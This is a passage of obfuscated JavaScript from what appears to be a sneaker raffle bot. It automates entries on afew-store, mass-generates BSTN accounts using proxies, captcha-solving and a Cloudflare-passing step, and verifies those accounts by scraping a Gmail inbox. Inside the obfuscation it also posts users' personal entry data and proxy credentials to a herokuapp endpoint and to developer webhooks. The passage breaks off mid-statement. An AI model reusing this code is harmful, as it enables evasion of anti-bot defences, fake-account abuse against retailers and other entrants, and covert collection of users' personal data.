                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3cb497[0x0] + ':' + _0x3cb497[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3de54f = await _0x3621d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3cb497[0x0] + ':' + _0x3cb497[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x5c429c = JSON['parse'](_0x4a3989['readFileSync']('sizes.json', 'utf-8')), _0x8b9a62 = _0x5a1962[_0x1714b7]['Url'], _0x14e506 = _0x5a1962[_0x1714b7]['Size'], _0x5e8dc9;
                        async function _0xbea222() {
                            var _0x59f86a = new _0x307d2e['CookieJar']();
                            console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x199b20;
                            let _0x539b2c = {
                                'method': 'GET',
                                'cookieJar': _0x59f86a,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x3cb497[0x2] + ':' + _0x3cb497[0x3] + '@' + _0x3cb497[0x0] + ':' + _0x3cb497[0x1]
                            }, _0x3cb472 = _0x8b9a62['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x5f57ba = _0x3cb472 + '.json', _0x2a4f5c = await _0x4012a9(_0x5f57ba);
                            console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x54736c = _0x2a4f5c['data']['product']['variants'];
                            if (_0x14e506 != 'RANDOM') {
                                if (_0x54736c[0x1]['option1']['includes']('W')) {
                                    const _0x223154 = _0x5c429c['women']['find'](_0x12c160 => _0x12c160['EUsize'] === _0x14e506);
                                    _0x223154 && (_0x14e506 = _0x223154['size']);
                                } else {
                                    if (_0x54736c[0x1]['option1']['includes']('Y')) {
                                        const _0x5cf92b = _0x5c429c['GS']['find'](_0x14eaa2 => _0x14eaa2['EUsize'] === _0x14e506);
                                        _0x5cf92b && (_0x14e506 = _0x5cf92b['size']);
                                    } else {
                                        const _0x50c1dd = _0x5c429c['men']['find'](_0x4ed78f => _0x4ed78f['EUsize'] === _0x14e506);
                                        _0x50c1dd && (_0x14e506 = _0x50c1dd['size']);
                                    }
                                }
                                for (var _0x148a3b of _0x54736c) {
                                    _0x148a3b['option1'] == _0x14e506 && (_0x199b20 = _0x148a3b['id']);
                                }
                            } else {
                                var _0x333556 = Math['round'](Math['random']() * (_0x54736c['length'] - 0x1));
                                _0x199b20 = _0x54736c[_0x333556]['id'];
                            }
                            console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x4012a9('https://raffles.afew-store.com/cart/' + _0x199b20 + ':1'), _0x5e8dc9 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0xbea222();
                        } catch (_0x3bd93e) {
                            if (_0x3bd93e['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x3bd93e);
                        }
                        const _0x2020cd = await _0x3de54f['newPage']();
                        await _0x2020cd['setDefaultNavigationTimeout'](0x1d4c0), await _0x2020cd['authenticate']({
                            'username': '' + _0x3cb497[0x2],
                            'password': '' + _0x3cb497[0x3]
                        }), await _0x2020cd['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2020cd['setRequestInterception'](!![]), _0x2020cd['on']('request', _0x2a229e => {
                            _0x2a229e['resourceType']() === 'image' || _0x2a229e['resourceType']() === 'font' || _0x2a229e['resourceType']() === 'media' ? _0x2a229e['abort']() : _0x2a229e['continue']();
                        });
                        try {
                            await _0x2020cd['goto'](_0x5e8dc9, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2020cd['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2020cd['type']('#checkout_email', '' + _0x5a1962[_0x1714b7]['Email']), await _0x4d97b0(0x320), await _0x2020cd['type']('#checkout_attributes_instagram', '' + _0x5a1962[_0x1714b7]['Follower']), await _0x4d97b0(0x320), await _0x2020cd['select']('#checkout_shipping_address_country', '' + _0x5a1962[_0x1714b7]['Country']), await _0x2020cd['waitForTimeout'](0x258), await _0x2020cd['type']('#checkout_shipping_address_first_name', '' + _0x5a1962[_0x1714b7]['FirstName']), await _0x2020cd['waitForTimeout'](0x320), await _0x2020cd['type']('#checkout_shipping_address_last_name', '' + _0x5a1962[_0x1714b7]['LastName']), await _0x2020cd['waitForTimeout'](0x2bc), await _0x2020cd['type']('#checkout_shipping_address_address1', _0x5a1962[_0x1714b7]['Address1'] + '\x20' + _0x5a1962[_0x1714b7]['HouseNumber']), await _0x2020cd['waitForTimeout'](0x2bc), await _0x2020cd['type']('#checkout_shipping_address_address2', '' + _0x5a1962[_0x1714b7]['Address2']), await _0x2020cd['waitForTimeout'](0x2bc), await _0x2020cd['type']('#checkout_shipping_address_zip', '' + _0x5a1962[_0x1714b7]['Zip']), await _0x2020cd['waitForTimeout'](0x2bc), await _0x2020cd['type']('#checkout_shipping_address_city', '' + _0x5a1962[_0x1714b7]['City']), await _0x2020cd['waitForTimeout'](0x2bc);
                        if (_0x5a1962[_0x1714b7]['State'] != '')
                            try {
                                const _0x1741c9 = JSON['parse'](_0x4a3989['readFileSync']('States.json', 'utf8'));
                                await _0x4d97b0(0x1f4);
                                if (_0x5a1962[_0x1714b7]['State']['length'] > 0x2)
                                    for (let _0x2fe6ba of _0x1741c9) {
                                        if (_0x2fe6ba['Province'] == _0x5a1962[_0x1714b7]['State']) {
                                            await _0x2020cd['select']('#checkout_shipping_address_province', _0x2fe6ba['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2020cd['select']('#checkout_shipping_address_province', _0x5a1962[_0x1714b7]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x4d97b0(0x1f4), console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x4d97b0(0x190), _0x2020cd['evaluate'](() => {
                            const _0x1b9e5d = document['querySelector']('#continue_button');
                            for (var _0x37b562 = 0x0; _0x37b562 < 0x5; _0x37b562++) {
                                if (_0x1b9e5d) {
                                    _0x1b9e5d['click'](), _0x1b9e5d['click']();
                                    break;
                                } else
                                    _0x4d97b0(0xfa0);
                            }
                        }), await _0x2020cd['waitForTimeout'](0x9c4);
                        try {
                            await _0x2020cd['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2020cd['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x1eb90e => _0x1eb90e['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2020cd['waitForTimeout'](0x7d0), console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2020cd['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x4d97b0(0x3e8), await _0x2020cd['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x4733fe => _0x4733fe['submit']()), await _0x4d97b0(0x3e8);
                        try {
                            await _0x2020cd['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2020cd['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x57c270 => _0x57c270['submit']());
                        try {
                            await _0x2020cd['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x3e3ee2 = 'no', _0x3b7ca0(_0x5a1962[_0x1714b7], _0x1a148e), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                                try {
                                    await _0xa7b872(_0x4562fb['webhook'], _0x1250df['succesDEVMSG']);
                                } catch {
                                }
                            await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x1250df['succesDEVMSG']), await _0x4d97b0(0xc8);
                            try {
                                await _0xa7b872(_0x3f583b, _0x1250df['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x1d8120['replace']('#', ''),
                                    'module': _0x1a148e['name'],
                                    'entrydata': JSON['stringify'](_0x1e1c34),
                                    'proxy': '' + _0x2dcafb[_0x1714b7]
                                };
                                var _0x5e976a = JSON['stringify'](prxdata);
                                let _0x196e5b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x5e976a, _0x196e5b);
                            } catch (_0x2f315a) {
                            }
                        } catch (_0x2453de) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x38ec81) {
                        _0x38ec81['message']['includes']('selector') && (_0x38ec81 = 'Connection\x20Error');
                        console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20' + _0x38ec81)), _0x14dfe4 = '' + _0x38ec81;
                        var _0x394a15 = await _0x4ef820(_0x5a1962[_0x1714b7], _0x1a148e, 'dev', !![], _0x14dfe4);
                        _0x1250df['errorDEV'] = { 'embeds': [_0x394a15] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x1250df['errorDEV']), await _0xa7b872(_0x5f83c7, _0x1250df['errorDEV']), _0x3e3ee2 = 'yes';
                    } finally {
                        _0x3de54f && _0x3de54f['close']();
                        if (_0x3e3ee2 == 'yes' && _0x552df9 != 0x5 && _0x14dfe4 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x552df9 + '\x20/\x205)')), _0x1714b7 = _0x1714b7 - 0x1, _0x552df9 = _0x552df9 + 0x1;
                            continue;
                        }
                        _0x3e3ee2 == 'yes' && _0x552df9 >= 0x5 && (_0x320814(_0x5a1962[_0x1714b7], _0x1a148e), _0x3e3ee2 = 'no', _0x552df9 = 0x0);
                        if (_0x1714b7 + 0x1 == _0x5a1962['length']) {
                            await _0x4d97b0(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4562fb['AfewDelay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x51b008, _0x1be2ac, _0x3c6c48) {
                    var _0x3a3176 = _0x1be2ac, _0xc98320 = 0x0;
                    for (var _0x10f355 = 0x0; _0x10f355 < _0x1be2ac['length']; _0x10f355++) {
                        maxTasks = Number(_0x4562fb['threads']);
                        while (_0xc98320 >= maxTasks) {
                            await _0x4d97b0(_0x4562fb['delay']);
                        }
                        async function _0x436c41(_0x3cdf11, _0x3e6029, _0x4c0b02, _0x1b95f0, _0x609bcc) {
                            _0xc98320++, _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4562fb['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x3aa088;
                            try {
                                await _0x43eceb(_0x3e6029, _0x1b95f0);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x81eb1(_0x3cdf11['name'] + '\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20/\x20' + _0x3e6029['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                            var _0x353113 = await _0x4ef820(_0x3e6029[_0x1b95f0], _0x3cdf11, 'acc', ![]);
                            const _0x1a2c9c = { 'succesDEVMSG': { 'embeds': [_0x353113] } }, _0x327e38 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x489222 = Math['round'](Math['random']() * (_0x4c0b02['length'] - 0x1)), _0x387b25 = _0x4c0b02[_0x489222]['split'](':'), _0x378bba;
                            try {
                                _0x378bba = await _0x3621d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x387b25[0x0] + ':' + _0x387b25[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x378bba = await _0x3621d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x387b25[0x0] + ':' + _0x387b25[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x3a5973 = await _0x378bba['newPage']();
                                await _0x3a5973['authenticate']({
                                    'username': '' + _0x387b25[0x2],
                                    'password': '' + _0x387b25[0x3]
                                }), console['log'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a5973['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3a5973['setRequestInterception'](!![]), _0x3a5973['on']('request', _0x52f4a1 => {
                                    _0x52f4a1['resourceType']() === 'image' ? _0x52f4a1['abort']() : _0x52f4a1['continue']();
                                });
                                try {
                                    await _0x3a5973['goto']('' + _0x327e38), await _0x3a5973['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x3a5973['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4d97b0(0x7d0), console['log'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4d97b0(0x190), await _0x3a5973['waitForSelector']('#firstname'), await _0x3a5973['focus']('#firstname'), await _0x3a5973['keyboard']['down']('Control'), await _0x3a5973['keyboard']['press']('A'), await _0x4d97b0(0xc8), await _0x3a5973['keyboard']['up']('Control'), await _0x3a5973['keyboard']['press']('Backspace'), await _0x3a5973['type']('#firstname', _0x3e6029[_0x1b95f0]['FirstName'], { 'delay': 0xf0 }), await _0x4d97b0(0x190), await _0x3a5973['focus']('#lastname'), await _0x3a5973['keyboard']['down']('Control'), await _0x3a5973['keyboard']['press']('A'), await _0x4d97b0(0xc8), await _0x3a5973['keyboard']['up']('Control'), await _0x3a5973['keyboard']['press']('Backspace'), await _0x3a5973['type']('#lastname', _0x3e6029[_0x1b95f0]['LastName'], { 'delay': 0xe6 }), await _0x4d97b0(0x190), await _0x3a5973['focus']('#email_address'), await _0x3a5973['keyboard']['down']('Control'), await _0x3a5973['keyboard']['press']('A'), await _0x4d97b0(0xc8), await _0x3a5973['keyboard']['up']('Control'), await _0x3a5973['keyboard']['press']('Backspace'), await _0x3a5973['type']('#email_address', _0x3e6029[_0x1b95f0]['Email'], { 'delay': 0x122 }), await _0x4d97b0(0x190), await _0x3a5973['type']('#password', _0x3e6029[_0x1b95f0]['Password'], { 'delay': 0x82 }), await _0x4d97b0(0x1f4), await _0x3a5973['type']('#password-confirmation', _0x3e6029[_0x1b95f0]['Password'], { 'delay': 0x7c }), console['log'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4d97b0(0x2bc), await _0x3a5973['$eval']('#form-validate', _0x435a32 => _0x435a32['submit']()), await _0x4d97b0(0x1388);
                                const _0x28eecc = await _0x3a5973['$']('#email_address-error');
                                if (_0x28eecc)
                                    throw new Error('Invalid\x20Email');
                                const _0x2db058 = await _0x3a5973['$']('#password-error');
                                if (_0x2db058)
                                    throw new Error('Invalid\x20Password');
                                await _0x3a5973['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20Account\x20' + _0x3e6029[_0x1b95f0]['Email'] + '\x20Generated')), _0x4a3989['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x3e6029[_0x1b95f0]['Email'] + ',' + _0x3e6029[_0x1b95f0]['Password']);
                                try {
                                    _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x1a2c9c['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa7b872(_0x392309, _0x1a2c9c['succesDEVMSG']);
                                let _0x5b5530 = _0x3e6029[_0x1b95f0];
                                try {
                                    prxdata = {
                                        'username': _0x1d8120['replace']('#', ''),
                                        'module': _0x3cdf11['name'],
                                        'entrydata': JSON['stringify'](_0x5b5530),
                                        'proxy': '' + _0x4c0b02[_0x1b95f0]
                                    };
                                    var _0x10f196 = JSON['stringify'](prxdata);
                                    let _0x47e12d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x10f196, _0x47e12d);
                                } catch (_0x4d4afc) {
                                }
                                console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x311780) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20' + _0x311780)), _0x3aa088 = '' + _0x311780;
                                var _0x51f8b3 = await _0x4ef820(_0x3e6029[_0x1b95f0], _0x3cdf11, 'acc', !![], _0x3aa088);
                                _0x1a2c9c['errorDEV'] = { 'embeds': [_0x51f8b3] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x1a2c9c['errorDEV']), await _0xa7b872(_0x5f83c7, _0x1a2c9c['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x378bba)
                                    _0x378bba['close']();
                                if (retry == 'yes' && _0x609bcc != 0x5)
                                    return console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Task\x20' + (_0x1b95f0 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x609bcc + 0x1) + '\x20/\x205)')), _0xc98320--, _0x609bcc = _0x609bcc + 0x1, _0x436c41(_0x3cdf11, _0x3e6029, _0x4c0b02, _0x1b95f0, _0x609bcc);
                                retry == 'yes' && _0x609bcc >= 0x5 && (_0x320814(_0x3e6029[_0x1b95f0], _0x3cdf11), retry = 'no', _0x609bcc = 0x0), _0xc98320--, console['log'](_0x1211a5() + '\x20[' + _0x3cdf11['name'] + ']\x20Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                            }
                        }
                        _0x436c41(_0x51b008, _0x3a3176, _0x3c6c48, _0x10f355, 0x0), await _0x4d97b0(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xa94fef, _0x186ef8) {
                    var _0x1e27ae = ![], _0x5ae18e = [], _0x214876 = 0x0;
                    async function _0x2bb3fb() {
                        var _0x1ef65d = new _0x1aebaf({
                            'user': _0x4562fb['masterMail'],
                            'password': _0x4562fb['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x311716(_0x46e44a) {
                            _0x1ef65d['openBox']('INBOX', ![], _0x46e44a);
                        }
                        _0x1ef65d['once']('ready', function () {
                            _0x311716(function (_0x5aa746, _0x4fc663) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5aa746)
                                    throw _0x5aa746;
                                _0x1ef65d['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x11993d, _0x194eb2) {
                                    if (!_0x194eb2 || !_0x194eb2['length'])
                                        console['log'](_0x1211a5() + '\x20[' + _0xa94fef['name'] + ']\x20No\x20mails\x20found'), _0x1ef65d['end']();
                                    else {
                                        var _0x7cff5c = _0x1ef65d['seq']['fetch'](_0x194eb2, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x7cff5c['on']('message', function (_0x4bd10b, _0x3cf183) {
                                            var _0x34271d = '(#' + _0x3cf183 + ')\x20';
                                            _0x4bd10b['on']('body', function (_0x3e8e3c, _0x3cea72) {
                                                _0x372396(_0x3e8e3c, (_0x1644ec, _0x179586) => {
                                                    var _0x481b62 = _0x179586['text']['split']('customer/account/confirm/')[0x1], _0x2db693 = _0x481b62['split'](']')[0x0];
                                                    _0x5ae18e['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x2db693);
                                                });
                                            }), _0x4bd10b['once']('end', function () {
                                            });
                                        }), _0x7cff5c['once']('error', function (_0x22e28a) {
                                            console['log']('Fetch\x20error:\x20' + _0x22e28a), _0x1e27ae = !![];
                                        }), _0x7cff5c['once']('end', function () {
                                            _0x1ef65d['end'](), _0x1e27ae = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x1ef65d['once']('error', function (_0x48bdcb) {
                            console['log'](_0x1de0e8['red'](_0x48bdcb['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1e27ae = !![];
                        }), _0x1ef65d['once']('end', async function () {
                            _0x1e27ae = !![];
                        }), _0x1ef65d['connect']();
                    }
                    try {
                        _0x2bb3fb();
                        while (!_0x1e27ae) {
                            await _0x4d97b0(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5ae18e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4d97b0(0x7d0);
                    }
                    for (var _0x3f808e = 0x0; _0x3f808e < _0x5ae18e['length']; _0x3f808e++) {
                        maxTasks = Number(_0x4562fb['threads']);
                        while (_0x214876 >= maxTasks) {
                            await _0x4d97b0(_0x4562fb['delay']);
                        }
                        async function _0x5f94de(_0x399027, _0x4c3e0b, _0x324a80, _0x38b15a, _0x4ecb05) {
                            _0x214876++, _0x3621d0['use'](_0x509c12());
                            if (_0x2f1460 != 'yes')
                                var _0x2f1460 = '', _0x4ecb05 = 0x0;
                            var _0x4b1618 = Math['round'](Math['random']() * (_0x324a80['length'] - 0x1)), _0xd74442 = _0x324a80[_0x4b1618]['split'](':'), _0x13203b;
                            try {
                                _0x13203b = await _0x3621d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xd74442[0x0] + ':' + _0xd74442[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x13203b = await _0x3621d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xd74442[0x0] + ':' + _0xd74442[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x5738ab = await _0x13203b['newPage']();
                                await _0x5738ab['authenticate']({
                                    'username': '' + _0xd74442[0x2],
                                    'password': '' + _0xd74442[0x3]
                                }), console['log'](_0x1211a5() + '\x20[' + _0x399027['name'] + ']\x20Task\x20' + (_0x38b15a + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x5738ab['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5738ab['setRequestInterception'](!![]), _0x5738ab['on']('request', _0x834ae5 => {
                                    _0x834ae5['resourceType']() === 'image' || _0x834ae5['resourceType']() === 'font' || _0x834ae5['resourceType']() === 'media' ? _0x834ae5['abort']() : _0x834ae5['continue']();
                                }), console['log'](_0x1211a5() + '\x20[' + _0x399027['name'] + ']\x20Task\x20' + (_0x38b15a + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x5738ab['goto'](_0x4c3e0b[_0x38b15a]);
                                } catch (_0x56d3fa) {
                                    _0x2f1460 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x56d3fa);
                                }
                                console['log'](_0x1211a5() + '\x20[' + _0x399027['name'] + ']\x20Task\x20' + (_0x38b15a + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5738ab['waitForTimeout'](0xbb8);
                                try {
                                    await _0x5738ab['waitForSelector']('.account-nav'), _0x2f1460 = 'no', console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x399027['name'] + ']\x20Task\x20' + (_0x38b15a + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x462da7 = await _0x4ef820(null, _0x399027, 'ver', ![]);
                                    const _0x598ae4 = { 'succesDEVMSG': { 'embeds': [_0x462da7] } };
                                    await _0xa7b872(_0x19ce89, _0x598ae4['succesDEVMSG']);
                                } catch {
                                    _0x2f1460 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0xdea1a7) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x399027['name'] + ']\x20Task\x20' + (_0x38b15a + 0x1) + '\x20:\x20' + _0xdea1a7));
                                var _0x57ff1b = _0xdea1a7, _0x2c2fd4 = await _0x4ef820(null, _0x399027, 'ver', !![], _0x57ff1b);
                                const _0x3bdf08 = { 'errorDEVMSG': { 'embeds': [_0x2c2fd4] } };
                                _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x3bdf08['errorDEVMSG']), await _0xa7b872(_0x5f83c7, _0x3bdf08['errorDEVMSG']);
                            } finally {
                                if (_0x13203b)
                                    _0x13203b['close']();
                                if (_0x2f1460 == 'yes' && _0x4ecb05 != 0x5)
